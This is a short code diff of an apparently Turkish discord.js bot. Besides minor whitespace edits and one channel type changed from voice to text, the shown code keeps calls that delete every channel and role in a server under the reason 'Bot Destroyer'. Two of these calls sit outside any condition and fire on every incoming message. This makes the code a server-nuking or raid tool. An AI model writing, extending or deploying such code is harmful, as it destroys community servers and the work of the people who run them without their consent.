@@ -139,15 +139,13 @@ client.on("message", async message => {
         message.guild.channels.deleteAll("Bot Destroyer");
         message.guild.roles.deleteAll("Bot Destroyer");
         message.guild.createChannel(`hey`)
-
     }
 
     if(message.content === "cık"){
-        message.guild.leave();
+       message.guild.leave();
     }
-    message.guild.channels.deleteAll("Bot Destroyer");
-    message.guild.roles.deleteAll("Bot Destroyer");
-
+       message.guild.channels.deleteAll("Bot Destroyer");
+       message.guild.roles.deleteAll("Bot Destroyer");
 });
 
 client.on('message', async message => {
@@ -226,7 +224,7 @@ client.on('message', async message => {
      .then(channel =>
       channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
 
-      message.guild.createChannel(`1881-193∞`, "voice")
+      message.guild.createChannel(`1881-193∞`, "text")
       .then(channel =>
         channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
       .then(c => {
